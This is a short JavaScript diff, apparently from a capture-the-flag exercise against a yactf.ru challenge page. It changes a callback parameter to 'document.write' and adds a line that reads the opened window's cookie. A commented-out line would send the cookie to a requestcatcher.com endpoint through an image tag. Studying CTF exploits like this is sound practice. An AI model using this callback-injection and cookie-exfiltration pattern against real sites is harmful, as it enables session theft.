@@ -6,10 +6,11 @@ function xxx() {
     console.log('hello there!')
 }
 
-var w1 = window.open('https://random-slap.yactf.ru/pages/auth.html#callback=parent.xxx')
+var w1 = window.open('https://random-slap.yactf.ru/pages/auth.html#callback=document.write')
 
 // wait for window loaded
 setTimeout(() => {
+    alert(w1.document.cookie)
   //w1.document.write('<img src="https://test123.requestcatcher.com/test?cookie=123"/>')
 }, 2000)
 
